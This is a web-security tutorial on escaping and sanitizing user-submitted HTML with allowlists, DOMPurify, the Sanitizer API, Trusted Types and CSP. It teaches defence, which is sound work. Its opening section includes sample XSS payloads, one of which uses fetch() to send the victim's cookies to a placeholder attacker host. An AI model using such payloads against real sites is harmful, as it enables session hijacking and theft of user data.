Sanitizing & Securing User HTML

When users may submit HTML, escape what you can, sanitize with an allowlist when you can't, and add defense in depth with a Content-Security-Policy.

§1Know the Threat: XSS

Cross-site scripting happens when attacker-controlled markup runs as code in a victim's browser, which can steal sessions, act as the user, or rewrite the page. Scripts are the obvious vector, but event handlers and URLs run code too.

<img src=x onerror="fetch('//evil.example/?c='+document.cookie)">
<a href="javascript:alert(1)">click</a>
<svg><script>alert(1)</script></svg>

The core rule is to keep data and code apart: output encoding for text, and sanitization for the cases where you want to keep some markup.

§2Allowlist Sanitization

Define exactly which elements and attributes are permitted and drop everything else. Denylists fail because attackers find the tag you forgot.

import DOMPurify from "dompurify";

const clean = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ["p", "b", "i", "em", "strong", "a", "ul", "ol", "li", "code"],
  ALLOWED_ATTR: ["href"],
});
el.innerHTML = clean;

Use a mature, maintained library and sanitize on output in the final context. Don't write your own with regular expressions, since the HTML parser handles cases regexes can't. Also force link safety by adding rel attributes and restricting URL schemes to http, https, and mailto.

§3The Sanitizer API and Trusted Types

Browsers are adding built-in tools. The HTML Sanitizer API (element.setHTML(input)) parses and sanitizes in one step, and Trusted Types make dangerous sinks like innerHTML accept only specially approved values. Support varies, so check current browser status before depending on them, and fall back to a library where needed.

// where supported
el.setHTML(userHtml);   // sanitizes by default; scripts and handlers are dropped

// enforced via a response header:
// Content-Security-Policy: require-trusted-types-for 'script'

§4Defense in Depth

Add a Content-Security-Policy so that even if something slips through, injected inline scripts don't run.

Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'self'

Pair it with HttpOnly and SameSite cookies so that script access to session data is limited anyway.

Escape first, sanitize second If users don't need to submit formatting, store and render plain text with output encoding. Allow HTML only when a real feature requires it.

§5Common Mistakes

MistakeWhat HappensFix
Blocklisting <script> onlyEvent handlers and javascript: URLs bypass itUse an allowlist for elements, attributes, and URL schemes
Sanitizing on input but rendering in a different context laterEncoding mismatch re-introduces riskSanitize or encode at output for the destination context
Writing a custom sanitizerParser differentials and bypassesUse a reviewed library or the platform sanitizer
Practice
  1. Use an allowlist sanitizer on a comment box and test it against a list of known XSS payloads.
  2. Add a CSP header to a small app and watch the browser block an injected inline script.
Key takeaways
  • Treat user HTML as hostile: encode text, and sanitize with an allowlist when markup is required.
  • Prefer maintained libraries and platform APIs to custom code.
  • Use CSP and Trusted Types as defense in depth.
